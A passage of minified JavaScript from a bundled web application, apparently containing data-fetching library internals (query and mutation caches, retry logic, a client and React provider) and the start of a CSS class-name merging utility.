this.listeners.size>0}onSubscribe(){}onUnsubscribe(){}},i0={setTimeout:(i,l)=>setTimeout(i,l),clearTimeout:i=>clearTimeout(i),setInterval:(i,l)=>setInterval(i,l),clearInterval:i=>clearInterval(i)},n0=class{#e=i0;#r=!1;setTimeoutProvider(i){this.#e=i}setTimeout(i,l){return this.#e.setTimeout(i,l)}clearTimeout(i){this.#e.clearTimeout(i)}setInterval(i,l){return this.#e.setInterval(i,l)}clearInterval(i){this.#e.clearInterval(i)}},Pl=new n0;function l0(i){setTimeout(i,0)}var ji=typeof window>"u"||"Deno"in globalThis;function _a(){}function c0(i,l){return typeof i=="function"?i(l):i}function d0(i){return typeof i=="number"&&i>=0&&i!==1/0}function m0(i,l){return Math.max(i+(l||0)-Date.now(),0)}function Ul(i,l){return typeof i=="function"?i(l):i}function u0(i,l){return typeof i=="function"?i(l):i}function ox(i,l){const{type:u="all",exact:m,fetchStatus:f,predicate:j,queryKey:A,stale:R}=i;if(A){if(m){if(l.queryHash!==Ql(A,l.options))return!1}else if(!Fs(l.queryKey,A))return!1}if(u!=="all"){const O=l.isActive();if(u==="active"&&!O||u==="inactive"&&O)return!1}return!(typeof R=="boolean"&&l.isStale()!==R||f&&f!==l.state.fetchStatus||j&&!j(l))}function ix(i,l){const{exact:u,status:m,predicate:f,mutationKey:j}=i;if(j){if(!l.options.mutationKey)return!1;if(u){if(ks(l.options.mutationKey)!==ks(j))return!1}else if(!Fs(l.options.mutationKey,j))return!1}return!(m&&l.state.status!==m||f&&!f(l))}function Ql(i,l){return(l?.queryKeyHashFn||ks)(i)}function ks(i){return JSON.stringify(i,(l,u)=>Il(u)?Object.keys(u).sort().reduce((m,f)=>(m[f]=u[f],m),{}):u)}function Fs(i,l){return i===l?!0:typeof i!=typeof l?!1:i&&l&&typeof i=="object"&&typeof l=="object"?Object.keys(l).every(u=>Fs(i[u],l[u])):!1}var x0=Object.prototype.hasOwnProperty;function qx(i,l,u=0){if(i===l)return i;if(u>500)return l;const m=nx(i)&&nx(l);if(!m&&!(Il(i)&&Il(l)))return l;const j=(m?i:Object.keys(i)).length,A=m?l:Object.keys(l),R=A.length,O=m?new Array(R):{};let w=0;for(let D=0;D<R;D++){const k=m?D:A[D],U=i[k],$=l[k];if(U===$){O[k]=U,(m?D<j:x0.call(i,k))&&w++;continue}if(U===null||$===null||typeof U!="object"||typeof $!="object"){O[k]=$;continue}const Y=qx(U,$,u+1);O[k]=Y,Y===U&&w++}return j===R&&w===j?i:O}function nx(i){return Array.isArray(i)&&i.length===Object.keys(i).length}function Il(i){if(!lx(i))return!1;const l=i.constructor;if(l===void 0)return!0;const u=l.prototype;return!(!lx(u)||!u.hasOwnProperty("isPrototypeOf")||Object.getPrototypeOf(i)!==Object.prototype)}function lx(i){return Object.prototype.toString.call(i)==="[object Object]"}function p0(i){return new Promise(l=>{Pl.setTimeout(l,i)})}function h0(i,l,u){return typeof u.structuralSharing=="function"?u.structuralSharing(i,l):u.structuralSharing!==!1?qx(i,l):l}function f0(i,l,u=0){const m=[...i,l];return u&&m.length>u?m.slice(1):m}function b0(i,l,u=0){const m=[l,...i];return u&&m.length>u?m.slice(0,-1):m}var Yl=Symbol();function Nx(i,l){return!i.queryFn&&l?.initialPromise?()=>l.initialPromise:!i.queryFn||i.queryFn===Yl?()=>Promise.reject(new Error(`Missing queryFn: '${i.queryHash}'`)):i.queryFn}function g0(i,l,u){let m=!1,f;return Object.defineProperty(i,"signal",{enumerable:!0,get:()=>(f??=l(),m||(m=!0,f.aborted?u():f.addEventListener("abort",u,{once:!0})),f)}),i}var v0=class extends vi{#e;#r;#a;constructor(){super(),this.#a=i=>{if(!ji&&window.addEventListener){const l=()=>i();return window.addEventListener("visibilitychange",l,!1),()=>{window.removeEventListener("visibilitychange",l)}}}}onSubscribe(){this.#r||this.setEventListener(this.#a)}onUnsubscribe(){this.hasListeners()||(this.#r?.(),this.#r=void 0)}setEventListener(i){this.#a=i,this.#r?.(),this.#r=i(l=>{typeof l=="boolean"?this.setFocused(l):this.onFocus()})}setFocused(i){this.#e!==i&&(this.#e=i,this.onFocus())}onFocus(){const i=this.isFocused();this.listeners.forEach(l=>{l(i)})}isFocused(){return typeof this.#e=="boolean"?this.#e:globalThis.document?.visibilityState!=="hidden"}},Lx=new v0;function j0(){let i,l;const u=new Promise((f,j)=>{i=f,l=j});u.status="pending",u.catch(()=>{});function m(f){Object.assign(u,f),delete u.resolve,delete u.reject}return u.resolve=f=>{m({status:"fulfilled",value:f}),i(f)},u.reject=f=>{m({status:"rejected",reason:f}),l(f)},u}var y0=l0;function S0(){let i=[],l=0,u=R=>{R()},m=R=>{R()},f=y0;const j=R=>{l?i.push(R):f(()=>{u(R)})},A=()=>{const R=i;i=[],R.length&&f(()=>{m(()=>{R.forEach(O=>{u(O)})})})};return{batch:R=>{let O;l++;try{O=R()}finally{l--,l||A()}return O},batchCalls:R=>(...O)=>{j(()=>{R(...O)})},schedule:j,setNotifyFunction:R=>{u=R},setBatchNotifyFunction:R=>{m=R},setScheduler:R=>{f=R}}}var ea=S0(),A0=class extends vi{#e=!0;#r;#a;constructor(){super(),this.#a=i=>{if(!ji&&window.addEventListener){const l=()=>i(!0),u=()=>i(!1);return window.addEventListener("online",l,!1),window.addEventListener("offline",u,!1),()=>{window.removeEventListener("online",l),window.removeEventListener("offline",u)}}}}onSubscribe(){this.#r||this.setEventListener(this.#a)}onUnsubscribe(){this.hasListeners()||(this.#r?.(),this.#r=void 0)}setEventListener(i){this.#a=i,this.#r?.(),this.#r=i(this.setOnline.bind(this))}setOnline(i){this.#e!==i&&(this.#e=i,this.listeners.forEach(u=>{u(i)}))}isOnline(){return this.#e}},mi=new A0;function R0(i){return Math.min(1e3*2**i,3e4)}function zx(i){return(i??"online")==="online"?mi.isOnline():!0}var kl=class extends Error{constructor(i){super("CancelledError"),this.revert=i?.revert,this.silent=i?.silent}};function wx(i){let l=!1,u=0,m;const f=j0(),j=()=>f.status!=="pending",A=G=>{if(!j()){const K=new kl(G);U(K),i.onCancel?.(K)}},R=()=>{l=!0},O=()=>{l=!1},w=()=>Lx.isFocused()&&(i.networkMode==="always"||mi.isOnline())&&i.canRun(),D=()=>zx(i.networkMode)&&i.canRun(),k=G=>{j()||(m?.(),f.resolve(G))},U=G=>{j()||(m?.(),f.reject(G))},$=()=>new Promise(G=>{m=K=>{(j()||w())&&G(K)},i.onPause?.()}).then(()=>{m=void 0,j()||i.onContinue?.()}),Y=()=>{if(j())return;let G;const K=u===0?i.initialPromise:void 0;try{G=K??i.fn()}catch(oe){G=Promise.reject(oe)}Promise.resolve(G).then(k).catch(oe=>{if(j())return;const Pe=i.retry??(ji?0:3),ye=i.retryDelay??R0,Te=typeof ye=="function"?ye(u,oe):ye,ze=Pe===!0||typeof Pe=="number"&&u<Pe||typeof Pe=="function"&&Pe(u,oe);if(l||!ze){U(oe);return}u++,i.onFail?.(u,oe),p0(Te).then(()=>w()?void 0:$()).then(()=>{l?U(oe):Y()})})};return{promise:f,status:()=>f.status,cancel:A,continue:()=>(m?.(),f),cancelRetry:R,continueRetry:O,canStart:D,start:()=>(D()?Y():$().then(Y),f)}}var Xx=class{#e;destroy(){this.clearGcTimeout()}scheduleGc(){this.clearGcTimeout(),d0(this.gcTime)&&(this.#e=Pl.setTimeout(()=>{this.optionalRemove()},this.gcTime))}updateGcTime(i){this.gcTime=Math.max(this.gcTime||0,i??(ji?1/0:300*1e3))}clearGcTimeout(){this.#e&&(Pl.clearTimeout(this.#e),this.#e=void 0)}},E0=class extends Xx{#e;#r;#a;#s;#t;#i;#n;constructor(i){super(),this.#n=!1,this.#i=i.defaultOptions,this.setOptions(i.options),this.observers=[],this.#s=i.client,this.#a=this.#s.getQueryCache(),this.queryKey=i.queryKey,this.queryHash=i.queryHash,this.#e=dx(this.options),this.state=i.state??this.#e,this.scheduleGc()}get meta(){return this.options.meta}get promise(){return this.#t?.promise}setOptions(i){if(this.options={...this.#i,...i},this.updateGcTime(this.options.gcTime),this.state&&this.state.data===void 0){const l=dx(this.options);l.data!==void 0&&(this.setState(cx(l.data,l.dataUpdatedAt)),this.#e=l)}}optionalRemove(){!this.observers.length&&this.state.fetchStatus==="idle"&&this.#a.remove(this)}setData(i,l){const u=h0(this.state.data,i,this.options);return this.#o({data:u,type:"success",dataUpdatedAt:l?.updatedAt,manual:l?.manual}),u}setState(i,l){this.#o({type:"setState",state:i,setStateOptions:l})}cancel(i){const l=this.#t?.promise;return this.#t?.cancel(i),l?l.then(_a).catch(_a):Promise.resolve()}destroy(){super.destroy(),this.cancel({silent:!0})}reset(){this.destroy(),this.setState(this.#e)}isActive(){return this.observers.some(i=>u0(i.options.enabled,this)!==!1)}isDisabled(){return this.getObserversCount()>0?!this.isActive():this.options.queryFn===Yl||this.state.dataUpdateCount+this.state.errorUpdateCount===0}isStatic(){return this.getObserversCount()>0?this.observers.some(i=>Ul(i.options.staleTime,this)==="static"):!1}isStale(){return this.getObserversCount()>0?this.observers.some(i=>i.getCurrentResult().isStale):this.state.data===void 0||this.state.isInvalidated}isStaleByTime(i=0){return this.state.data===void 0?!0:i==="static"?!1:this.state.isInvalidated?!0:!m0(this.state.dataUpdatedAt,i)}onFocus(){this.observers.find(l=>l.shouldFetchOnWindowFocus())?.refetch({cancelRefetch:!1}),this.#t?.continue()}onOnline(){this.observers.find(l=>l.shouldFetchOnReconnect())?.refetch({cancelRefetch:!1}),this.#t?.continue()}addObserver(i){this.observers.includes(i)||(this.observers.push(i),this.clearGcTimeout(),this.#a.notify({type:"observerAdded",query:this,observer:i}))}removeObserver(i){this.observers.includes(i)&&(this.observers=this.observers.filter(l=>l!==i),this.observers.length||(this.#t&&(this.#n?this.#t.cancel({revert:!0}):this.#t.cancelRetry()),this.scheduleGc()),this.#a.notify({type:"observerRemoved",query:this,observer:i}))}getObserversCount(){return this.observers.length}invalidate(){this.state.isInvalidated||this.#o({type:"invalidate"})}async fetch(i,l){if(this.state.fetchStatus!=="idle"&&this.#t?.status()!=="rejected"){if(this.state.data!==void 0&&l?.cancelRefetch)this.cancel({silent:!0});else if(this.#t)return this.#t.continueRetry(),this.#t.promise}if(i&&this.setOptions(i),!this.options.queryFn){const R=this.observers.find(O=>O.options.queryFn);R&&this.setOptions(R.options)}const u=new AbortController,m=R=>{Object.defineProperty(R,"signal",{enumerable:!0,get:()=>(this.#n=!0,u.signal)})},f=()=>{const R=Nx(this.options,l),w=(()=>{const D={client:this.#s,queryKey:this.queryKey,meta:this.meta};return m(D),D})();return this.#n=!1,this.options.persister?this.options.persister(R,w,this):R(w)},A=(()=>{const R={fetchOptions:l,options:this.options,queryKey:this.queryKey,client:this.#s,state:this.state,fetchFn:f};return m(R),R})();this.options.behavior?.onFetch(A,this),this.#r=this.state,(this.state.fetchStatus==="idle"||this.state.fetchMeta!==A.fetchOptions?.meta)&&this.#o({type:"fetch",meta:A.fetchOptions?.meta}),this.#t=wx({initialPromise:l?.initialPromise,fn:A.fetchFn,onCancel:R=>{R instanceof kl&&R.revert&&this.setState({...this.#r,fetchStatus:"idle"}),u.abort()},onFail:(R,O)=>{this.#o({type:"failed",failureCount:R,error:O})},onPause:()=>{this.#o({type:"pause"})},onContinue:()=>{this.#o({type:"continue"})},retry:A.options.retry,retryDelay:A.options.retryDelay,networkMode:A.options.networkMode,canRun:()=>!0});try{const R=await this.#t.start();if(R===void 0)throw new Error(`${this.queryHash} data is undefined`);return this.setData(R),this.#a.config.onSuccess?.(R,this),this.#a.config.onSettled?.(R,this.state.error,this),R}catch(R){if(R instanceof kl){if(R.silent)return this.#t.promise;if(R.revert){if(this.state.data===void 0)throw R;return this.state.data}}throw this.#o({type:"error",error:R}),this.#a.config.onError?.(R,this),this.#a.config.onSettled?.(this.state.data,R,this),R}finally{this.scheduleGc()}}#o(i){const l=u=>{switch(i.type){case"failed":return{...u,fetchFailureCount:i.failureCount,fetchFailureReason:i.error};case"pause":return{...u,fetchStatus:"paused"};case"continue":return{...u,fetchStatus:"fetching"};case"fetch":return{...u,...C0(u.data,this.options),fetchMeta:i.meta??null};case"success":const m={...u,...cx(i.data,i.dataUpdatedAt),dataUpdateCount:u.dataUpdateCount+1,...!i.manual&&{fetchStatus:"idle",fetchFailureCount:0,fetchFailureReason:null}};return this.#r=i.manual?m:void 0,m;case"error":const f=i.error;return{...u,error:f,errorUpdateCount:u.errorUpdateCount+1,errorUpdatedAt:Date.now(),fetchFailureCount:u.fetchFailureCount+1,fetchFailureReason:f,fetchStatus:"idle",status:"error",isInvalidated:!0};case"invalidate":return{...u,isInvalidated:!0};case"setState":return{...u,...i.state}}};this.state=l(this.state),ea.batch(()=>{this.observers.forEach(u=>{u.onQueryUpdate()}),this.#a.notify({query:this,type:"updated",action:i})})}};function C0(i,l){return{fetchFailureCount:0,fetchFailureReason:null,fetchStatus:zx(l.networkMode)?"fetching":"paused",...i===void 0&&{error:null,status:"pending"}}}function cx(i,l){return{data:i,dataUpdatedAt:l??Date.now(),error:null,isInvalidated:!1,status:"success"}}function dx(i){const l=typeof i.initialData=="function"?i.initialData():i.initialData,u=l!==void 0,m=u?typeof i.initialDataUpdatedAt=="function"?i.initialDataUpdatedAt():i.initialDataUpdatedAt:0;return{data:l,dataUpdateCount:0,dataUpdatedAt:u?m??Date.now():0,error:null,errorUpdateCount:0,errorUpdatedAt:0,fetchFailureCount:0,fetchFailureReason:null,fetchMeta:null,isInvalidated:!1,status:u?"success":"pending",fetchStatus:"idle"}}function mx(i){return{onFetch:(l,u)=>{const m=l.options,f=l.fetchOptions?.meta?.fetchMore?.direction,j=l.state.data?.pages||[],A=l.state.data?.pageParams||[];let R={pages:[],pageParams:[]},O=0;const w=async()=>{let D=!1;const k=Y=>{g0(Y,()=>l.signal,()=>D=!0)},U=Nx(l.options,l.fetchOptions),$=async(Y,G,K)=>{if(D)return Promise.reject();if(G==null&&Y.pages.length)return Promise.resolve(Y);const Pe=(()=>{const Me={client:l.client,queryKey:l.queryKey,pageParam:G,direction:K?"backward":"forward",meta:l.options.meta};return k(Me),Me})(),ye=await U(Pe),{maxPages:Te}=l.options,ze=K?b0:f0;return{pages:ze(Y.pages,ye,Te),pageParams:ze(Y.pageParams,G,Te)}};if(f&&j.length){const Y=f==="backward",G=Y?_0:ux,K={pages:j,pageParams:A},oe=G(m,K);R=await $(K,oe,Y)}else{const Y=i??j.length;do{const G=O===0?A[0]??m.initialPageParam:ux(m,R);if(O>0&&G==null)break;R=await $(R,G),O++}while(O<Y)}return R};l.options.persister?l.fetchFn=()=>l.options.persister?.(w,{client:l.client,queryKey:l.queryKey,meta:l.options.meta,signal:l.signal},u):l.fetchFn=w}}}function ux(i,{pages:l,pageParams:u}){const m=l.length-1;return l.length>0?i.getNextPageParam(l[m],l,u[m],u):void 0}function _0(i,{pages:l,pageParams:u}){return l.length>0?i.getPreviousPageParam?.(l[0],l,u[0],u):void 0}var M0=class extends Xx{#e;#r;#a;#s;constructor(i){super(),this.#e=i.client,this.mutationId=i.mutationId,this.#a=i.mutationCache,this.#r=[],this.state=i.state||O0(),this.setOptions(i.options),this.scheduleGc()}setOptions(i){this.options=i,this.updateGcTime(this.options.gcTime)}get meta(){return this.options.meta}addObserver(i){this.#r.includes(i)||(this.#r.push(i),this.clearGcTimeout(),this.#a.notify({type:"observerAdded",mutation:this,observer:i}))}removeObserver(i){this.#r=this.#r.filter(l=>l!==i),this.scheduleGc(),this.#a.notify({type:"observerRemoved",mutation:this,observer:i})}optionalRemove(){this.#r.length||(this.state.status==="pending"?this.scheduleGc():this.#a.remove(this))}continue(){return this.#s?.continue()??this.execute(this.state.variables)}async execute(i){const l=()=>{this.#t({type:"continue"})},u={client:this.#e,meta:this.options.meta,mutationKey:this.options.mutationKey};this.#s=wx({fn:()=>this.options.mutationFn?this.options.mutationFn(i,u):Promise.reject(new Error("No mutationFn found")),onFail:(j,A)=>{this.#t({type:"failed",failureCount:j,error:A})},onPause:()=>{this.#t({type:"pause"})},onContinue:l,retry:this.options.retry??0,retryDelay:this.options.retryDelay,networkMode:this.options.networkMode,canRun:()=>this.#a.canRun(this)});const m=this.state.status==="pending",f=!this.#s.canStart();try{if(m)l();else{this.#t({type:"pending",variables:i,isPaused:f}),this.#a.config.onMutate&&await this.#a.config.onMutate(i,this,u);const A=await this.options.onMutate?.(i,u);A!==this.state.context&&this.#t({type:"pending",context:A,variables:i,isPaused:f})}const j=await this.#s.start();return await this.#a.config.onSuccess?.(j,i,this.state.context,this,u),await this.options.onSuccess?.(j,i,this.state.context,u),await this.#a.config.onSettled?.(j,null,this.state.variables,this.state.context,this,u),await this.options.onSettled?.(j,null,i,this.state.context,u),this.#t({type:"success",data:j}),j}catch(j){try{await this.#a.config.onError?.(j,i,this.state.context,this,u)}catch(A){Promise.reject(A)}try{await this.options.onError?.(j,i,this.state.context,u)}catch(A){Promise.reject(A)}try{await this.#a.config.onSettled?.(void 0,j,this.state.variables,this.state.context,this,u)}catch(A){Promise.reject(A)}try{await this.options.onSettled?.(void 0,j,i,this.state.context,u)}catch(A){Promise.reject(A)}throw this.#t({type:"error",error:j}),j}finally{this.#a.runNext(this)}}#t(i){const l=u=>{switch(i.type){case"failed":return{...u,failureCount:i.failureCount,failureReason:i.error};case"pause":return{...u,isPaused:!0};case"continue":return{...u,isPaused:!1};case"pending":return{...u,context:i.context,data:void 0,failureCount:0,failureReason:null,error:null,isPaused:i.isPaused,status:"pending",variables:i.variables,submittedAt:Date.now()};case"success":return{...u,data:i.data,failureCount:0,failureReason:null,error:null,status:"success",isPaused:!1};case"error":return{...u,data:void 0,error:i.error,failureCount:u.failureCount+1,failureReason:i.error,isPaused:!1,status:"error"}}};this.state=l(this.state),ea.batch(()=>{this.#r.forEach(u=>{u.onMutationUpdate(i)}),this.#a.notify({mutation:this,type:"updated",action:i})})}};function O0(){return{context:void 0,data:void 0,error:null,failureCount:0,failureReason:null,isPaused:!1,status:"idle",variables:void 0,submittedAt:0}}var D0=class extends vi{constructor(i={}){super(),this.config=i,this.#e=new Set,this.#r=new Map,this.#a=0}#e;#r;#a;build(i,l,u){const m=new M0({client:i,mutationCache:this,mutationId:++this.#a,options:i.defaultMutationOptions(l),state:u});return this.add(m),m}add(i){this.#e.add(i);const l=ni(i);if(typeof l=="string"){const u=this.#r.get(l);u?u.push(i):this.#r.set(l,[i])}this.notify({type:"added",mutation:i})}remove(i){if(this.#e.delete(i)){const l=ni(i);if(typeof l=="string"){const u=this.#r.get(l);if(u)if(u.length>1){const m=u.indexOf(i);m!==-1&&u.splice(m,1)}else u[0]===i&&this.#r.delete(l)}}this.notify({type:"removed",mutation:i})}canRun(i){const l=ni(i);if(typeof l=="string"){const m=this.#r.get(l)?.find(f=>f.state.status==="pending");return!m||m===i}else return!0}runNext(i){const l=ni(i);return typeof l=="string"?this.#r.get(l)?.find(m=>m!==i&&m.state.isPaused)?.continue()??Promise.resolve():Promise.resolve()}clear(){ea.batch(()=>{this.#e.forEach(i=>{this.notify({type:"removed",mutation:i})}),this.#e.clear(),this.#r.clear()})}getAll(){return Array.from(this.#e)}find(i){const l={exact:!0,...i};return this.getAll().find(u=>ix(l,u))}findAll(i={}){return this.getAll().filter(l=>ix(i,l))}notify(i){ea.batch(()=>{this.listeners.forEach(l=>{l(i)})})}resumePausedMutations(){const i=this.getAll().filter(l=>l.state.isPaused);return ea.batch(()=>Promise.all(i.map(l=>l.continue().catch(_a))))}};function ni(i){return i.options.scope?.id}var T0=class extends vi{constructor(i={}){super(),this.config=i,this.#e=new Map}#e;build(i,l,u){const m=l.queryKey,f=l.queryHash??Ql(m,l);let j=this.get(f);return j||(j=new E0({client:i,queryKey:m,queryHash:f,options:i.defaultQueryOptions(l),state:u,defaultOptions:i.getQueryDefaults(m)}),this.add(j)),j}add(i){this.#e.has(i.queryHash)||(this.#e.set(i.queryHash,i),this.notify({type:"added",query:i}))}remove(i){const l=this.#e.get(i.queryHash);l&&(i.destroy(),l===i&&this.#e.delete(i.queryHash),this.notify({type:"removed",query:i}))}clear(){ea.batch(()=>{this.getAll().forEach(i=>{this.remove(i)})})}get(i){return this.#e.get(i)}getAll(){return[...this.#e.values()]}find(i){const l={exact:!0,...i};return this.getAll().find(u=>ox(l,u))}findAll(i={}){const l=this.getAll();return Object.keys(i).length>0?l.filter(u=>ox(i,u)):l}notify(i){ea.batch(()=>{this.listeners.forEach(l=>{l(i)})})}onFocus(){ea.batch(()=>{this.getAll().forEach(i=>{i.onFocus()})})}onOnline(){ea.batch(()=>{this.getAll().forEach(i=>{i.onOnline()})})}},q0=class{#e;#r;#a;#s;#t;#i;#n;#o;constructor(i={}){this.#e=i.queryCache||new T0,this.#r=i.mutationCache||new D0,this.#a=i.defaultOptions||{},this.#s=new Map,this.#t=new Map,this.#i=0}mount(){this.#i++,this.#i===1&&(this.#n=Lx.subscribe(async i=>{i&&(await this.resumePausedMutations(),this.#e.onFocus())}),this.#o=mi.subscribe(async i=>{i&&(await this.resumePausedMutations(),this.#e.onOnline())}))}unmount(){this.#i--,this.#i===0&&(this.#n?.(),this.#n=void 0,this.#o?.(),this.#o=void 0)}isFetching(i){return this.#e.findAll({...i,fetchStatus:"fetching"}).length}isMutating(i){return this.#r.findAll({...i,status:"pending"}).length}getQueryData(i){const l=this.defaultQueryOptions({queryKey:i});return this.#e.get(l.queryHash)?.state.data}ensureQueryData(i){const l=this.defaultQueryOptions(i),u=this.#e.build(this,l),m=u.state.data;return m===void 0?this.fetchQuery(i):(i.revalidateIfStale&&u.isStaleByTime(Ul(l.staleTime,u))&&this.prefetchQuery(l),Promise.resolve(m))}getQueriesData(i){return this.#e.findAll(i).map(({queryKey:l,state:u})=>{const m=u.data;return[l,m]})}setQueryData(i,l,u){const m=this.defaultQueryOptions({queryKey:i}),j=this.#e.get(m.queryHash)?.state.data,A=c0(l,j);if(A!==void 0)return this.#e.build(this,m).setData(A,{...u,manual:!0})}setQueriesData(i,l,u){return ea.batch(()=>this.#e.findAll(i).map(({queryKey:m})=>[m,this.setQueryData(m,l,u)]))}getQueryState(i){const l=this.defaultQueryOptions({queryKey:i});return this.#e.get(l.queryHash)?.state}removeQueries(i){const l=this.#e;ea.batch(()=>{l.findAll(i).forEach(u=>{l.remove(u)})})}resetQueries(i,l){const u=this.#e;return ea.batch(()=>(u.findAll(i).forEach(m=>{m.reset()}),this.refetchQueries({type:"active",...i},l)))}cancelQueries(i,l={}){const u={revert:!0,...l},m=ea.batch(()=>this.#e.findAll(i).map(f=>f.cancel(u)));return Promise.all(m).then(_a).catch(_a)}invalidateQueries(i,l={}){return ea.batch(()=>(this.#e.findAll(i).forEach(u=>{u.invalidate()}),i?.refetchType==="none"?Promise.resolve():this.refetchQueries({...i,type:i?.refetchType??i?.type??"active"},l)))}refetchQueries(i,l={}){const u={...l,cancelRefetch:l.cancelRefetch??!0},m=ea.batch(()=>this.#e.findAll(i).filter(f=>!f.isDisabled()&&!f.isStatic()).map(f=>{let j=f.fetch(void 0,u);return u.throwOnError||(j=j.catch(_a)),f.state.fetchStatus==="paused"?Promise.resolve():j}));return Promise.all(m).then(_a)}fetchQuery(i){const l=this.defaultQueryOptions(i);l.retry===void 0&&(l.retry=!1);const u=this.#e.build(this,l);return u.isStaleByTime(Ul(l.staleTime,u))?u.fetch(l):Promise.resolve(u.state.data)}prefetchQuery(i){return this.fetchQuery(i).then(_a).catch(_a)}fetchInfiniteQuery(i){return i.behavior=mx(i.pages),this.fetchQuery(i)}prefetchInfiniteQuery(i){return this.fetchInfiniteQuery(i).then(_a).catch(_a)}ensureInfiniteQueryData(i){return i.behavior=mx(i.pages),this.ensureQueryData(i)}resumePausedMutations(){return mi.isOnline()?this.#r.resumePausedMutations():Promise.resolve()}getQueryCache(){return this.#e}getMutationCache(){return this.#r}getDefaultOptions(){return this.#a}setDefaultOptions(i){this.#a=i}setQueryDefaults(i,l){this.#s.set(ks(i),{queryKey:i,defaultOptions:l})}getQueryDefaults(i){const l=[...this.#s.values()],u={};return l.forEach(m=>{Fs(i,m.queryKey)&&Object.assign(u,m.defaultOptions)}),u}setMutationDefaults(i,l){this.#t.set(ks(i),{mutationKey:i,defaultOptions:l})}getMutationDefaults(i){const l=[...this.#t.values()],u={};return l.forEach(m=>{Fs(i,m.mutationKey)&&Object.assign(u,m.defaultOptions)}),u}defaultQueryOptions(i){if(i._defaulted)return i;const l={...this.#a.queries,...this.getQueryDefaults(i.queryKey),...i,_defaulted:!0};return l.queryHash||(l.queryHash=Ql(l.queryKey,l)),l.refetchOnReconnect===void 0&&(l.refetchOnReconnect=l.networkMode!=="always"),l.throwOnError===void 0&&(l.throwOnError=!!l.suspense),!l.networkMode&&l.persister&&(l.networkMode="offlineFirst"),l.queryFn===Yl&&(l.enabled=!1),l}defaultMutationOptions(i){return i?._defaulted?i:{...this.#a.mutations,...i?.mutationKey&&this.getMutationDefaults(i.mutationKey),...i,_defaulted:!0}}clear(){this.#e.clear(),this.#r.clear()}},N0=se.createContext(void 0),L0=({client:i,children:l})=>(se.useEffect(()=>(i.mount(),()=>{i.unmount()}),[i]),r.jsx(N0.Provider,{value:i,children:l}));function Bx(i){var l,u,m="";if(typeof i=="string"||typeof i=="number")m+=i;else if(typeof i=="object")if(Array.isArray(i)){var f=i.length;for(l=0;l<f;l++)i[l]&&(u=Bx(i[l]))&&(m&&(m+=" "),m+=u)}else for(u in i)i[u]&&(m&&(m+=" "),m+=u);return m}function z0(){for(var i,l,u=0,m="",f=arguments.length;u<f;u++)(i=arguments[u])&&(l=Bx(i))&&(m&&(m+=" "),m+=l);return m}const w0=(i,l)=>{const u=new Array(i.length+l.length);for(let m=0;m<i.length;m++)u[m]=i[m];for(let m=0;m<l.length;m++)u[i.length+m]=l[m];return u},X0=(i,l)=>({classGroupId:i,validator:l}),Px=(i=new Map,l=null,u)=>({nextPart:i,validators:l,classGroupId:u}),ui="-",xx=[],B0="arbitrary..",P0=i=>{const l=I0(i),{conflictingClassGroups:u,conflictingClassGroupModifiers:m}=i;return{getClassGroupId:A=>{if(A.startsWith("[")&&A.endsWith("]"))return U0(A);const R=A.split(ui),O=R[0]===""&&R.length>1?1:0;return Ux(R,O,l)},getConflictingClassGroupIds:(A,R)=>{if(R){const O=m[A],w=u[A];return O?w?w0(w,O):O:w||xx}return u[A]||xx}}},Ux=(i,l,u)=>{if(i.length-l===0)return u.classGroupId;const f=i[l],j=u.nextPart.get(f);if(j){const w=Ux(i,l+1,j);if(w)return w}const A=u.validators;if(A===null)return;const R=l===0?i.join(ui):i.slice(l).join(ui),O=A.length;for(let w=0;w<O;w++){const D=A[w];if(D.validator(R))return D.classGroupId}},U0=i=>i.slice(1,-1).indexOf(":")===-1?void 0:(()=>{const l=i.slice(1,-1),u=l.indexOf(":"),m=l.slice(0,u);return m?B0+m:void 0})(),I0=i=>{const{theme:l,classGroups:u}=i;return k0(u,l)},k0=(i,l)=>{const u=Px();for(const m in i){const f=i[m];Kl(f,u,m,l)}return u},Kl=(i,l,u,m)=>{const f=i.length;for(let j=0;j<f;j++){const A=i[j];F0(A,l,u,m)}},F0=(i,l,u,m)=>{if(typeof i=="string"){G0(i,l,u);return}if(typeof i=="function"){V0(i,l,u,m);return}H0(i,l,u,m)},G0=(i,l,u)=>{const m=i===""?l:Ix(l,i);m.classGroupId=u},V0=(i,l,u,m)=>{if(Z0(i)){Kl(i(m),l,u,m);return}l.validators===null&&(l.validators=[]),l.validators.push(X0(u,i))},H0=(i,l,u,m)=>{const f=Object.entries(i),j=f.length;for(let A=0;A<j;A++){const[R,O]=f[A];Kl(O,Ix(l,R),u,m)}},Ix=(i,l)=>{let u=i;const m=l.split(ui),f=m.length;for(let j=0;j<f;j++){const A=m[j];let R=u.nextPart.get(A);R||(R=Px(),u.nextPart.set(A,R)),u=R}return u},Z0=i=>"isThemeGetter"in i&&i.isThemeGetter===!0,Q0=i=>{if(i<1)return{get:()=>{},set:()=>{}};let l=0,u=Object.create(null),m=Object.create(null);const f=(j,A)=>{u[j]=A,l++,l>i&&(l=0,m=u,u=Object.create(null))};return{get(j){let A=u[j];if(A!==void 0)return A;if((A=m[j])!==void 0)return f(j,A),A},set(j,A){j in u?u[j]=A:f(j,A)}}},Fl="!",px=":",Y0=[],hx=(i,l,u,m,f)=>({modifiers:i,hasImportantModifier:l,baseClassName:u,maybePostfixModifierPosition:m,isExternal:f}),K0=i=>{const{prefix:l,experimentalParseClassName:u}=i;let m=f=>{const j=[];let A=0,R=0,O=0,w;const D=f.length;for(let G=0;G<D;G++){const K=f[G];if(A===0&&R===0){if(K===px){j.push(f.slice(O,G)),O=G+1;continue}if(K==="/"){w=G;continue}}K==="["?A++:K==="]"?A--:K==="("?R++:K===")"&&R--}const k=j.length===0?f:f.slice(O);let U=k,$=!1;k.endsWith(Fl)?(U=k.slice(0,-1),$=!0):k.startsWith(Fl)&&(U=k.slice(1),$=!0);const Y=w&&w>O?w-O:void 0;return hx(j,$,U,Y)};if(l){const f=l+px,j=m;m=A=>A.startsWith(f)?j(A.slice(f.length)):hx(Y0,!1,A,void 0,!0)}if(u){const f=m;m=j=>u({className:j,parseClassName:f})}return m},W0=i=>{const l=new Map;return i.orderSensitiveModifiers.forEach((u,m)=>{l.set(u,1e6+m)}),u=>{const m=[];let f=[];for(let j=0;j<u.length;j++){const A=u[j],R=A[0]==="[",O=l.has(A);R||O?(f.length>0&&(f.sort(),m.push(...f),f=[]),m.push(A)):f.push(A)}return 